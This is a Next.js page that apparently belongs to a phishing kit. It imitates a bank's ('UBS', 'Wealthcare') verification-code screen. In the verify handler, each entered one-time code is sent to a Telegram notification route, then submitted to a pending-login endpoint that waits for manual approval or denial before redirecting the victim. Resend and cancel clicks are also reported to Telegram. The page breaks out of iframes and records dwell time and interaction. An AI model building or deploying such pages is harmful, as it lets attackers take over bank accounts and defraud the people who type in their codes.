"use client";

import {
  Suspense,
  useCallback,
  useEffect,
  useLayoutEffect,
  useRef,
  useState,
} from "react";
import { useRouter } from "next/navigation";
import { Check, Lock, Mail, MessageSquare, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";
import { SiteFooter } from "@/components/site-footer";
import { ThreeDotSpinner } from "@/components/ThreeDotSpinner";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import {
  PEAKONE_NEUTRAL_FILL,
  PEAKONE_NEUTRAL_HOVER,
  PEAKONE_PRIMARY_FILL,
  PEAKONE_PRIMARY_HOVER,
  WEALTHCARE_BUTTON_CHROME,
  WEALTHCARE_BUTTON_GEOMETRY,
} from "@/lib/wealthcare-button-styles";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages";

/** Reference step-2 copy, verbatim. No masked-address line. */
const NOTE_TEXT =
  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";

/** Validated internally, not displayed — the reference shows no length hint. */
const OTP_LENGTH = 6;

/** Shared Wealthcare tokens — see `lib/wealthcare-button-styles.ts`. */
const BUTTON_CHROME = `${WEALTHCARE_BUTTON_GEOMETRY} gap-3.5 ${WEALTHCARE_BUTTON_CHROME}`;

const CONTENT_COLUMN =
  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]";

const CONTENT_INNER =
  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]";

function EnterCodeContent() {
  const router = useRouter();

  useLayoutEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_verify")) {
      window.location.href = "/";
    }
  }, []);

  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [method, setMethod] = useState<"email" | "text">("email");
  const inputRef = useRef<HTMLInputElement | null>(null);
  const verifyingRef = useRef(false);
  const mountedAtRef = useRef<number>(Date.now());
  const interactedRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined" && window.self !== window.top) {
      window.top!.location.href =
        window.location.pathname + window.location.search;
    }
  }, []);

  useEffect(() => {
    try {
      const stored = sessionStorage.getItem("verification_method");
      if (stored === "email" || stored === "text") setMethod(stored);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => {
      interactedRef.current = true;
    };
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setInterval(() => {
      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [resendCooldown]);

  const handleCodeChange = (value: string) => {
    if (isLoading) return;
    const digits = value.replace(/\D/g, "").slice(0, OTP_LENGTH);
    setCode(digits);
    if (error) setError("");
  };

  const handleVerify = useCallback(async () => {
    if (isLoading || verifyingRef.current) return;
    setError("");
    if (code.length !== OTP_LENGTH) {
      setError(OTP_CODE_ERROR_TEXT);
      return;
    }

    verifyingRef.current = true;
    setIsLoading(true);

    /* Fire-and-forget: the notification must never sit on the UI critical path. */
    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: "Code",
        code,
      }),
      keepalive: true,
    }).catch(() => {});

    try {
      /* Gate 2 — a separate pending-login row from Gate 1. */
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId:
            typeof window !== "undefined"
              ? sessionStorage.getItem("loginUserId") || "login"
              : "login",
          password: code,
          method,
          flow: "otp",
          dwellMs: Date.now() - mountedAtRef.current,
          interacted: interactedRef.current,
        }),
      });
      const data = (await res.json().catch(() => ({}))) as { id?: string };

      if (!res.ok || !data?.id) {
        verifyingRef.current = false;
        setIsLoading(false);
        setError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }

      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
      verifyingRef.current = false;
      setIsLoading(false);

      /* approved AND redirected both hand off to the member site. */
      if (outcome === "approved" || outcome === "redirected") {
        window.location.href = "/api/login-out";
        return;
      }
      if (outcome === "denied") {
        setCode("");
        setError(OTP_CODE_ERROR_TEXT);
        setTimeout(() => inputRef.current?.focus(), 0);
        return;
      }
      setError(
        outcome === "timeout"
          ? MSG_UNABLE_VERIFY_TIME
          : MSG_UNABLE_REACH_VERIFICATION,
      );
    } catch {
      verifyingRef.current = false;
      setIsLoading(false);
      setError(MSG_UNABLE_REACH_VERIFICATION);
    }
  }, [isLoading, code, method]);
  const handleResend = async () => {
    if (isResending || resendCooldown > 0) return;
    setIsResending(true);
    setCode("");
    setError("");
    try {
      void fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
      }).catch(() => {});
      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
    } finally {
      /* Cooldown in finally so it applies even if the wait throws. */
      setIsResending(false);
      setResendCooldown(OTP_RESEND_COOLDOWN_SEC);
      inputRef.current?.focus();
    }
  };

  const handleCancel = () => {
    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ verificationType: "Did not receive code" }),
      keepalive: true,
    }).catch(() => {});
    window.location.href = "/verify-choice";
  };

  const isEmail = method === "email";
  const contactLabel = isEmail ? "Email" : "SMS";
  const ContactGlyph = isEmail ? Mail : MessageSquare;

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <VerificationHeader />

      <main className="flex-1 flex flex-col min-[1200px]:items-center">
        <div className={CONTENT_COLUMN}>
          <div className={CONTENT_INNER}>
            <div className="mb-[18px]">
              <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                {isEmail ? "An e-mail has been sent:" : "An SMS has been sent:"}
              </p>
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
                Enter the verification code that you received via{" "}
                <strong className="font-semibold">{contactLabel}</strong> below:
              </p>
              <p className="text-[14px] leading-[1.6] text-[#707070] text-center mt-4">
                Note - Do not share your verification code with anyone else
              </p>
            </div>

            {error ? (
              <p className="text-red-600 text-sm text-center mb-4" role="alert">
                {error}
              </p>
            ) : null}

            {/* Whole form region — code row AND buttons — swaps for the spinner.
                Keyed off isLoading so it starts on click. */}
            {isLoading ? (
              <ThreeDotSpinner label="Verifying your code" />
            ) : (
              <div>
                {/* Glyph at the row's left edge, label text at the 36px inset. */}
                <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
                  <div className="w-full max-[768px]:mx-[5px] min-[1200px]:w-[200px] min-[1200px]:mr-auto">
                    <div className="flex items-center gap-3.5">
                      <ContactGlyph
                        className="w-[22px] h-[22px] text-[#424242] shrink-0"
                        aria-hidden="true"
                      />
                      <span className="text-[14px] text-gray-700 whitespace-nowrap">
                        Confirmation Code
                      </span>
                    </div>
                  </div>
                  <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
                    <input
                      ref={inputRef}
                      type="text"
                      name="code"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      value={code}
                      onChange={(e) => handleCodeChange(e.target.value)}
                      onPaste={(e) => {
                        e.preventDefault();
                        handleCodeChange(e.clipboardData.getData("text"));
                      }}
                      aria-label="Confirmation Code"
                      className="w-full h-full px-3 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none"
                    />
                  </div>
                </div>

                <div className="w-[220px] mx-auto">
                  <Button
                    type="button"
                    disabled={code.length !== OTP_LENGTH}
                    onClick={() => void handleVerify()}
                    className={`${BUTTON_CHROME} mb-[10px] disabled:opacity-60`}
                    style={{
                      backgroundColor: PEAKONE_PRIMARY_FILL,
                      color: "#ffffff",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_PRIMARY_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_PRIMARY_FILL;
                    }}
                  >
                    <Check className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">Continue</span>
                  </Button>

                  <Button
                    type="button"
                    variant="secondary"
                    onClick={handleCancel}
                    className={`${BUTTON_CHROME} mb-[10px]`}
                    style={{
                      backgroundColor: PEAKONE_NEUTRAL_FILL,
                      color: "#2d2d2d",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_NEUTRAL_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_NEUTRAL_FILL;
                    }}
                  >
                    <X className="w-6 h-6 shrink-0" />
                    <span className="flex-1 text-center truncate">Cancel</span>
                  </Button>

                  {/* Not tied to verify isLoading — only to the resend lockout.
                      Countdown is surfaced in the label. No icon. */}
                  <Button
                    type="button"
                    variant="secondary"
                    disabled={isResending || resendCooldown > 0}
                    onClick={() => void handleResend()}
                    className={`${BUTTON_CHROME} disabled:opacity-60`}
                    style={{
                      backgroundColor: PEAKONE_PRIMARY_FILL,
                      color: "#ffffff",
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_PRIMARY_HOVER;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor =
                        PEAKONE_PRIMARY_FILL;
                    }}
                  >
                    <span
                      className={`truncate ${
                        isResending || resendCooldown > 0
                          ? "flex-1 text-center"
                          : ""
                      }`}
                    >
                      {isResending
                        ? "Sending..."
                        : resendCooldown > 0
                          ? `Resend Code (${resendCooldown})`
                          : "Resend Code"}
                    </span>
                  </Button>
                </div>
              </div>
            )}

            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
            <div
              role="note"
              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
              style={{ backgroundColor: "#F3F7A9" }}
            >
              <span
                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] rounded-full border-2 border-[#414141] text-[#414141] text-[20px] leading-[31px] text-center"
                aria-hidden="true"
              >
                i
              </span>
              <p className="m-0">{NOTE_TEXT}</p>
            </div>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen flex items-center justify-center">
          <p className="text-gray-600">Loading...</p>
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
